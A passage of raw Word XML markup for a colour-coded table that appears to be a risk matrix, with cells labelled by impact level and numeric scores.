              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>C</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="80"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>L</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>M</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>H</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>C</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="101"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="300" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="260" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="320" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1040" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="420" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="520" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="400" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="120" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FF0000"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="580" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="301"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="880" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Impact</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1040" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="80"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="420" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00E92E66">
            <w:pPr>
              <w:ind w:left="1440" w:right="63"/>
              <w:jc w:val="right"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="520" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="400" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="40"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="120" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
